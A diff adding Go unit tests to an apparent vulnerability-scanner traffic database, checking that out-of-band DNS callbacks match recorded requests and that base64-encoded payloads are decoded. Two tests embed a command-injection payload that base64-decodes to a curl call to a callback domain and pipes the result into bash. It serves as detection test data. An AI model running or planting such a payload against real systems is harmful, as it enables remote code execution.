@@ -141,6 +141,45 @@ func TestRecordOOBMatchesIndexedXRayToken(t *testing.T) {
 	}
 }
 
+func TestRecordOOBMatchesBase64EncodedPayloadToken(t *testing.T) {
+	db, err := Open(filepath.Join(t.TempDir(), "traffic.db"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer db.Close()
+
+	oobDomain := "d8kb11aaikafhln6t70ga5y1shcuwppdp.ukukk.uk"
+	payload := "<string>/bin/bash -c {echo,Y3VybCBodHRwOi8vZDhrYjExYWFpa2FmaGxuNnQ3MGdhNXkxc2hjdXdwcGRwLnVrdWtrLnVrL2kvZmVkZWZkL2wxc3QvcGlrMC8=}|{base64,-d}|{bash,-i}</string>"
+	id, err := db.RecordXRayRequest(
+		"POST",
+		"http://target.local/xml",
+		map[string][]string{"Content-Type": {"application/xml"}},
+		[]byte(payload),
+		0,
+		"",
+	)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	match, err := db.RecordOOB(model.OOBInteraction{
+		Protocol:      "dns",
+		FullID:        oobDomain + ".",
+		RawRequest:    ";; QUESTION SECTION:\n;" + oobDomain + ".\tIN\tA\n",
+		RemoteAddress: "127.0.0.1",
+		Timestamp:     time.Now(),
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if match == nil {
+		t.Fatal("expected base64 encoded OOB payload to match recorded xray request")
+	}
+	if match.Source != "xray" || match.ID != id {
+		t.Fatalf("expected xray request %d, got %#v", id, match)
+	}
+}
+
 func TestExtractRequestTokensIgnoresOrdinaryHeaderWords(t *testing.T) {
 	raw := "GET https://target.local/ HTTP/1.1\r\nAccept-Encoding: gzip\r\nSec-Fetch-Dest: document\r\n\r\n"
 	got := extractRequestTokens(raw)
@@ -178,6 +217,15 @@ func TestExtractRequestTokensDecodesEscapedOOBDomain(t *testing.T) {
 	}
 	if containsString(got, "2fi-smoke1234-abcd") {
 		t.Fatalf("encoded slash artifact should not be indexed: %#v", got)
+	}
+}
+
+func TestExtractRequestTokensDecodesBase64Payload(t *testing.T) {
+	raw := "<string>/bin/bash -c {echo,Y3VybCBodHRwOi8vZDhrYjExYWFpa2FmaGxuNnQ3MGdhNXkxc2hjdXdwcGRwLnVrdWtrLnVrL2kvZmVkZWZkL2wxc3QvcGlrMC8=}|{base64,-d}|{bash,-i}</string>"
+	got := extractRequestTokens(raw)
+	want := "d8kb11aaikafhln6t70ga5y1shcuwppdp.ukukk.uk"
+	if !containsString(got, want) {
+		t.Fatalf("expected base64 decoded OOB domain %q in %#v", want, got)
 	}
 }
 
